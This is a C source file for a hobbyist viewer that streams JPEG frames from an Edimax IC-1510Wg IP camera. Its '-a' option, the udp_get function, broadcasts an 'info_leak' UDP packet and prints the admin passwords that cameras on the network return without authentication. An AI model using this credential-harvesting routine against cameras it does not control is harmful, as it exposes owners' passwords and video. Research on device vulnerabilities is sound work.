/*
* util to get pictures from Edimax IC-1510Wg as video
* alpha 0.023
*
* This program is free software; you can redistribute it and/or modify
* it under the terms of the GNU General Public License version 2 as
* published by the Free Software Foundation.
+
* authors:
* (C) 2010  Thorben Went <info at dokumenteundeinstellungen dot de>
* (C) 2010  m0x <m0x_ru@mail.ru>
*
*/

#include <stdarg.h>
#include <getopt.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <signal.h>
#include "display.h"

/* default ip */
#define IP "192.168.178.25"
/* default video port */
#define PORT 4321
/* #define LOGIN_SIZE 120 size of login-packet, no longer used */
/* buffer size */
#define PICP_SIZE 30000 
#define VERSION "alpha 0.03"

/*
  since the camera sends 3 responses, this is used to filter unnecessary
  responses.
*/
struct iplinkedlist{
	struct iplinkedlist* next;
	char ip[16];
};

/*
  this works similar to printf
  it prints the message and does some cleanup
*/
void error(char * str, ...){
	va_list args;
	va_start(args, str);
	vprintf(str, args);
	va_end(args);
	fflush(stdout);
	close_display();/*mimii*/
	exit(1);
}

/*
  sometimes update_display doesn't recognize sigint well when
  i/o blocks
*/
void sigintfix(int sig){
	if(sig == SIGINT)
		error("Killed");
}

/*
  
*/
void show_help(char *argv[]) {
	printf("Edimax Video-Viewer %s\n\n",VERSION);
	printf("Usage:\n");
	printf("%s [Option] [IP]\n\n",argv[0]);
	printf("Options:\n");
	printf("-s\tSnapshot, write one picture to file\n");
	printf("-a\tLooks for the admin-pw of all devices\n");
	printf("-h\tYou are currently looking at it\n\n");
	printf("IP:\n");
	printf("\tIf you don't specify an ip\n");
	printf("\twe'll default to \"192.168.178.25\"\n\n");
	printf("Without options the binary will output\n");
	printf("a pseudo-video by requesting pic by pic.\n");
}

/*
  broadcast request to all cams reachable,
  we only allow 1 response from each camera.
  it was already mentioned in the readme that the design of
  the camera is funny/studid because it responses with a broadcast
  AND exposes the admin password and other sensitiv stuff when 
  requested. (no authentication required)
*/
void udp_get(void) {
	int sockfd, n, i = 0, cameras = 0, proceed;
	struct sockaddr_in dest, fromcam; /*connector's address information*/
	struct timeval tval;/*receive timeout*/
	size_t addr_len;
	int broadcast = 1;
	char text[623], passwd[512], name[512], *ip;
	FILE *file;
	struct iplinkedlist root;/*list of ip's that already responded*/
  struct iplinkedlist* rootptr;
	root.next = NULL;

	tval.tv_sec = 2;
	tval.tv_usec = 0;

	char info_leak[] = { 0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x02, 0xff, 0xfd };

	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
		error("Creakt socket\n");

	// this call is what allows broadcast packets to be sent:
	if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast,sizeof broadcast) == -1) 
		error("setsockopt (SO_BROADCAST)\n");
	
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof broadcast) == -1)
		error("setsockopt (SO_REUSEADDR)\n");
  
	if(setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tval, sizeof tval) == -1)
		error("setsockopt (SO_RCVTIMEO)\n");

	dest.sin_family = AF_INET;     // host byte order
	dest.sin_port = htons(13364); // short, network byte order
	dest.sin_addr.s_addr = INADDR_BROADCAST;   
	memset(dest.sin_zero, '\0', sizeof dest.sin_zero);

	if (bind(sockfd, (struct sockaddr *) &dest, sizeof(dest)) == -1) /* we want source and dest-port to be 13364 */
		error("Bind\n");

	printf("scanning...\n");
	if ((n=sendto(sockfd, info_leak, sizeof(info_leak), 0, (struct sockaddr *)&dest, sizeof dest)) == -1)
		error("sendto\n");

	/* printf("sent %d bytes to %s\n", n, inet_ntoa(dest.sin_addr)); */
	while(1){
		addr_len = sizeof fromcam;	
		memset(text, 0, sizeof(text));
		
		n = recvfrom(sockfd, text, sizeof(text), 0, (struct sockaddr *)&fromcam, &addr_len);
		if(n<1)/*most likely: connection timeout*/
			break;

		ip = inet_ntoa(fromcam.sin_addr);

		if(memcmp(text, info_leak, sizeof info_leak)) 
		/*matches all responses except ours
		since our request gets received by ourselves too 
		(we listen on the same port that we broadcast to*/
		{
			/*check if we already got a response from the peer*/
			rootptr = &root;
			proceed = 1;
			while(rootptr->next){
				rootptr = rootptr->next;
			
				if(!strcmp(rootptr->ip, ip)){  
	       	proceed = 0;/*already got response, try next response*/
					break;
				}
			}
		
			if(!proceed)
				continue;
	
			/*if not add it to the list*/
			rootptr->next = malloc(sizeof(struct iplinkedlist));
			rootptr->next->next = NULL;
			strncpy(rootptr->next->ip, ip ,15);
			rootptr->next->ip[15]='\0';

			/*now, parse the received data*/
			if(n<=333)/*not enough data ;)*/
				continue;

			char *ptr = text+170;
			int offset =0;

			//filter cam name
			while(*ptr && (ptr-text<n) && (ptr-text-170<sizeof name))/*only write to memory allowed to write to*/
			{
				name[offset] = *ptr;
				offset++;
				ptr++;
			}
		
			name[offset]='\0';
      
			//filter password
			ptr = text+333;
			offset = 0;
      
			while(*ptr && (ptr-text<n) && (ptr-text-333<sizeof passwd))/*only write to memory allowed to write to*/
			{
				passwd[offset] = *ptr;
				offset++;
				ptr++;
			}
		
			passwd[offset] = '\0';

			/*print password, cam name and so on*/
			printf("password for cam `%s'(%s) is '%s'\n", name, ip, passwd);
			cameras++;
		}
	}
	printf("done, found %i cameras.\n", cameras);
	close(sockfd);
/* 
        * get len of camname...*
        n = strlen(text+170);   //this could run forever if there is no nullbyte, could count mem outside buffer
        * to malloc this len to passwd *
        name = malloc(n);       //could alloc more than needed
        * then copy string from packet *
        strcpy(name, text+170);

	* get len of passwd...*
	n = strlen(text+333);
	* to malloc this len to passwd *
	passwd = malloc(n);
	* then copy string from packet *
	strcpy(passwd, text+333);
	printf("Password for Cam %s(%s) is: %s\n", name, inet_ntoa(fromcam.sin_addr), passwd);
*/

  /*remember to free the ip linked list, when you remove this exit*/
	exit(0);
}

/*
  receives an image from `sockfd'
    picbuffer = destination buffer
    maxlen = destination buffer len
    sockfd = socket descriptor
  return value: image end offset in destination buffer
    -1 on error
*/
int pic_req(int sockfd, char *picbuffer, int len) {
	char recbuffer[PICP_SIZE];
 
	int loop = 1,
	offset = 0,
	    n = 0,
	    i = 0;

	char picrp[] = { /*picture request packet: 4. byte (0x0e)*/
	0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	memset(&recbuffer, 0, sizeof(recbuffer));
	memset(picbuffer, 0, len);
 
	if((n = write(sockfd, picrp, sizeof(picrp))) == -1 )
		error("Error while write picrp");
	
	while(loop)
	{
		if ((n = recv(sockfd, recbuffer, sizeof recbuffer, 0))<1)
			error("Error while read picr-answer\n");
		if(len-offset<n)/*this is important since it protects us against buf overflows*/
		{
			memcpy(picbuffer+offset,recbuffer, len-offset);
			offset=len;
		} else {
			memcpy(picbuffer+offset,recbuffer, n);
			offset += n;
		}
		if(offset>1 && picbuffer[offset-2] == (char)0xff && picbuffer[offset-1] == (char)0xd9)
			loop=0;

		if(loop && offset >= len) 
		{/*this should NOT happen*/
			printf("buffer filled but no valid jpeg arrived!\n");
			return -1;
		}
	}
	return offset;
}

/* Login-Packet for first tests. Hardcoded username 1 with password muh 
int login_cam(int sockfd) {
	char loginp[] = { 0x00, 0x00, 0x00, 0x01, 0x31, 0x00, 0x6d, 0x75, 
0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; 

	if (write(sockfd, loginp, sizeof(loginp)) == -1 )
		error("Error while write login\n");

	if (read(sockfd, buffer, 120) == -1) 
		error("Error while read login-answer\n");
	
	if (buffer[3] == 0x08) {
		return 1;
	
	}
} */


int main(int argc, char *argv[]) {
	int len, sockfd, login, c, snap = 0, port = PORT;
	struct sockaddr_in dest;
	char ip[16]="";
	char picbuffer[PICP_SIZE];
	FILE *file;
	int res;
  
	while ((c = getopt (argc, argv, "sahp:")) != -1)
	  switch (c){
      case 'p':
        port = atoi(optarg);
        break;
	    case 's':
		    snap = 1;
		    break;
	    case 'a':
		    udp_get();
		    exit(0);
        break;
	    case 'h':
      default:
		    show_help(argv);
		    exit(0);
		    break;
	  }

	if(optind >= argc){
		printf("No ip specified, defaulting to: %s\n", IP);
		strncpy(ip, IP, 15);
	} else {
		strncpy(ip, argv[optind], 15);
	}
	
	ip[15]='\0';
  
	/*fixes some issues*/
	signal(SIGINT, sigintfix);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	if(sockfd == -1)
		error("Error while creating socket..\n");
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_family = AF_INET;
	dest.sin_addr.s_addr = inet_addr(ip); /* set destination IP number */  
	dest.sin_port = htons(port);          /* set destination port number */

	if (connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1)
		error("Error while connecting to %s:%i\n", ip, port);
		
  /*
	if ((login=login_cam(sockfd)) == -1){ 
		error("Error in login\n");
		exit(0);
	}
	else if (login == 1) {
		printf("Login success!\n");
	}*/
  
	if (snap) {
		file = fopen("snapshot.jpg","w");
		len = pic_req(sockfd, picbuffer, sizeof picbuffer);
		
		if(len == -1 || len <30)
			error("Failed to get picture from cam\n");

		fwrite(picbuffer+28,sizeof(picbuffer[0]),len-28,file);
		fclose(file);
		exit(0);
	} else {
		/* main-loop for pseudo-video*/
		unsigned short width, height;
		int inited = 0;
    
		while(1) {
			len = pic_req(sockfd, picbuffer, sizeof picbuffer);
		
			if(len < 30){
				printf("Getting picture from cam failed.. retrying\n");
				continue;
			}
			if(!inited){
				width = ntohs(*(short*)(picbuffer+8));
				height = ntohs(*(short*)(picbuffer+10));

				res = init_display(width,height); 
		
				if(res == -1)
					error("init_display failed!\n");
		
				printf("image dimensions: %ix%i\n", width, height);
				inited=1;
			}
		
			show_jpegmem(picbuffer+28, len-28);
			
			if(update_display() == -1) /* SIGINT will be handled by update_display*/
				exit(0);
		}
	}
	
	return 0;
}
